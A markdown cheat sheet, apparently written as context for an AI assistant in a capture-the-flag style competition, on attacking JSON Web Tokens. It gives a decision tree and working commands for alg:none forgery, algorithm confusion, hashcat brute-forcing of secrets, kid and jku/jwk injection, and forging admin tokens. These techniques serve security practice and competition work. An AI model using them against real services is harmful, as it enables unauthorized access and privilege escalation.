# JWT: Context for Claude

Quick reference to consult during the competition. Goal: given a token, decide the right vector
quickly and execute it via terminal/script. jwt.io is just visual support; the heavy lifting is
`jwt_tool`, `pyjwt`, and `hashcat`.

## Decoding: always do this first, without asking

```bash
python3 -c "
import base64, json
token = '<token>'
h, p, s = token.split('.')
def d(x):
    x += '=' * (-len(x) % 4)
    return json.loads(base64.urlsafe_b64decode(x))
print('Header:', d(h))
print('Payload:', d(p))
"
```

This gives you `alg` and the claims without depending on the network/browser. It solves it on the
spot, without opening jwt.io.

## Vector decision tree

```
alg == "none" (or the server doesn't validate the declared alg)
  → forge the header {"alg":"none"}, leave the signature empty: header.payload.

alg == "RS256"/"ES256" AND you have the server's public key
  → algorithm confusion: sign as HS256 using the public key as the secret
  → jwt_tool: python3 jwt_tool.py <token> -X k -pk public_key.pem

alg == "HS256" AND you suspect a weak/short secret
  → extract the hash for hashcat via jwt_tool, then:
    hashcat -a 0 -m 16500 <token> rockyou.txt
  → once the secret is found: jwt.encode(claims, secret, algorithm="HS256") via pyjwt

the header has "kid"
  → test path traversal / a predictable value in kid (jwt_tool -T guides this)

the header has "jwk" or "jku"
  → generate a key pair, embed the public key in the header, sign with the private key
  → jwt_tool -T has this mode too

none of the above and the token looks valid/correctly signed
  → the vector is probably not in the JWT itself; look at the application logic
    (what the claims control, IDOR in the claims, expiration not validated, etc.)
```

## Quick-reference commands

```bash
# General scan (jwt_tool tries to identify vulnerabilities automatically)
python3 jwt_tool.py <token> -M pb

# Interactive all-in-one attack (menu guided by vector)
python3 jwt_tool.py <token> -T

# Re-sign with a known secret (pyjwt)
python3 -c "
import jwt
print(jwt.encode({'user':'admin','role':'admin'}, '<secret>', algorithm='HS256'))
"

# Offline brute-force of an HS256 secret
hashcat -a 0 -m 16500 <token> rockyou.txt
```

## When to use jwt.io instead of a script

Only when the user wants to **view/edit visually** claims that are already resolved (known secret
or `none`); it doesn't save time on any discovery/attack step, which is always faster via
`jwt_tool`/a script.

## Common mistakes to avoid

- Forgetting the `=` Base64URL padding when decoding by hand → always use `-len(x) % 4` as above,
  or let the library (`pyjwt`, `jwt_tool`) handle it.
- Trying HS256 brute-force without first checking whether it's `alg:none`; test the cheapest
  vector first.
- Forgetting that the payload **is not secret**: any claim visible there is already useful
  information even before forging anything (e.g. `user`, `role`, `exp`, internal field names).
